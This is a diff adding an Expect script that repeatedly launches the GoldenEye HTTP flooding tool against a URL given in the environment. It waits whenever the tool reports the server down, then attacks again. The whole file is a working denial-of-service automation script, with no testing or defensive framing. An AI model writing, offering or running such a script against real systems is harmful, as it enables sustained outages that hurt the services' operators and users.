@@ -1,0 +1,10 @@
+#!/usr/bin/expect
+
+while {true} {
+    spawn goldeneye "$env(URL)" -w $env(WORKERS) -s $env(SOCKETS)
+    expect "Server may be DOWN!"
+    close
+	variable sleeptime [expr {int(rand()*40) + 20}]
+    send_user "Sleeping for $sleeptime seconds because server is down"
+    sleep $sleeptime
+}
